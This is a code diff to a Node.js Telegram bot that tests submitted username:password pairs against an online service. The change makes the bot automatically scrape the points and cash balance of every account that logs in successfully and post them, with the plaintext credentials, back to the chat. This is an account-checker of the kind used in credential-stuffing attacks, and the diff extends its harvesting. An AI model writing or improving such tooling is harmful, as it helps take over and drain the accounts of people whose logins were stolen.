@@ -26,11 +26,6 @@ const { createLogger } = require('./logger');
 
 const log = createLogger('telegram');
 
-// Track sessions kept alive after VALID outcomes for optional data capture.
-const pendingSessions = new Map();
-const pendingTimeouts = new Map();
-const pendingMeta = new Map();
-
 /**
  * Validates and parses the credential string format "user:pass".
  * @param {string} credentialString - Raw credential string
@@ -218,50 +213,39 @@ function initializeTelegramHandler(botToken, options = {}) {
         await fs.unlink(result.screenshot).catch(() => {});
       }
 
-      // Offer follow-up data capture only for valid credentials
-      if (result.status === 'VALID') {
-        const capturePrompt = await ctx.reply(buildCapturePrompt(), {
-          parse_mode: 'MarkdownV2',
-          reply_to_message_id: statusMsg.message_id,
-          ...Markup.inlineKeyboard([
-            [
-              Markup.button.callback('▶️ Yes, capture data', 'capture_data'),
-              Markup.button.callback('⛔ No, skip', 'capture_decline'),
-            ],
-          ]),
-        });
-
-        const sessionKey = `${chatId}:${capturePrompt.message_id}`;
-        if (result.session) {
-          pendingSessions.set(sessionKey, result.session);
-          pendingMeta.set(sessionKey, {
+      // Automatically capture data if credentials are VALID
+      if (result.status === 'VALID' && result.session) {
+        try {
+          log.info(`[chk] auto-capturing data for valid credentials`);
+          await updateStatus(buildCheckProgress('capture'));
+          
+          const capture = await captureAccountData(result.session, { timeoutMs: options.timeoutMs || 60000 });
+          const captureMessage = buildCaptureSummary({
+            points: capture.points,
+            cash: capture.cash,
             username: creds.username,
             password: creds.password,
           });
-        }
 
-        const captureExpiryMs = 60000; // expire prompt after 60s to avoid stale actions
-        const timerId = setTimeout(async () => {
-          try {
-            await ctx.telegram.editMessageText(
-              chatId,
-              capturePrompt.message_id,
-              undefined,
-              buildCaptureExpired(),
-              { parse_mode: 'MarkdownV2' }
-            );
-            const session = pendingSessions.get(sessionKey);
-            if (session) {
-              await closeBrowserSession(session).catch(() => {});
-              pendingSessions.delete(sessionKey);
-            }
-            pendingMeta.delete(sessionKey);
-            pendingTimeouts.delete(sessionKey);
-          } catch (err) {
-            // Ignore if already handled or edited
-          }
-        }, captureExpiryMs);
-        pendingTimeouts.set(sessionKey, timerId);
+          await ctx.reply(captureMessage, {
+            parse_mode: 'MarkdownV2',
+            reply_to_message_id: statusMsg.message_id,
+          });
+
+          log.info(`[chk] capture complete - points: ${capture.points}`);
+        } catch (captureErr) {
+          log.warn(`[chk] data capture failed: ${captureErr.message}`);
+          // Send error but don't block - credentials were already verified
+          await ctx.reply(buildCaptureFailed(captureErr.message), {
+            parse_mode: 'MarkdownV2',
+            reply_to_message_id: statusMsg.message_id,
+          });
+        } finally {
+          // Clean up session regardless
+          await closeBrowserSession(result.session).catch(() => {});
+        }
+      } else if (result.status === 'VALID' && !result.session) {
+        log.warn(`[chk] valid credentials but no session to capture data`);
       }
     } catch (err) {
       log.error('Credential check error:', err.message);
@@ -279,74 +263,6 @@ function initializeTelegramHandler(botToken, options = {}) {
   });
 
   // Handle inline button callbacks
-  bot.action('capture_data', async (ctx) => {
-    await ctx.answerCbQuery('⏳ Data capture flow will start soon.');
-    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
-    const timerId = pendingTimeouts.get(key);
-    if (timerId) {
-      clearTimeout(timerId);
-      pendingTimeouts.delete(key);
-    }
-    const session = pendingSessions.get(key);
-    if (!session) {
-      await ctx.reply(buildCaptureExpired(), {
-        parse_mode: 'MarkdownV2',
-        reply_to_message_id: ctx.update.callback_query.message.message_id,
-      });
-      return;
-    }
-    const meta = pendingMeta.get(key) || {};
-
-    try {
-      const capture = await captureAccountData(session, { timeoutMs: options.timeoutMs || 60000 });
-      const username = meta.username || 'unknown';
-      const password = meta.password || 'hidden';
-      const message =
-        buildCaptureSummary({ points: capture.points, cash: capture.cash, username, password });
-
-      await ctx.reply(message, {
-        parse_mode: 'MarkdownV2',
-        reply_to_message_id: ctx.update.callback_query.message.message_id,
-      });
-    } catch (err) {
-      log.error('Capture failed:', err.message);
-      await ctx.reply(buildCaptureFailed(err.message), {
-        parse_mode: 'MarkdownV2',
-        reply_to_message_id: ctx.update.callback_query.message.message_id,
-      });
-    } finally {
-      await closeBrowserSession(session).catch(() => {});
-      pendingSessions.delete(key);
-      pendingMeta.delete(key);
-    }
-  });
-
-  bot.action('capture_decline', async (ctx) => {
-    await ctx.answerCbQuery('✅ Capture skipped.');
-    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
-    const timerId = pendingTimeouts.get(key);
-    if (timerId) {
-      clearTimeout(timerId);
-      pendingTimeouts.delete(key);
-    }
-    const session = pendingSessions.get(key);
-    if (session) {
-      await closeBrowserSession(session).catch(() => {});
-      pendingSessions.delete(key);
-    }
-    pendingMeta.delete(key);
-    try {
-      await ctx.editMessageText(buildCaptureSkipped(), {
-        parse_mode: 'MarkdownV2',
-      });
-    } catch (err) {
-      await ctx.reply(buildCaptureSkipped(), {
-        parse_mode: 'MarkdownV2',
-        reply_to_message_id: ctx.update.callback_query.message.message_id,
-      });
-    }
-  });
-
   bot.action('guide', async (ctx) => {
     await ctx.answerCbQuery();
     await ctx.reply(buildGuideMessage(), { parse_mode: 'MarkdownV2' });
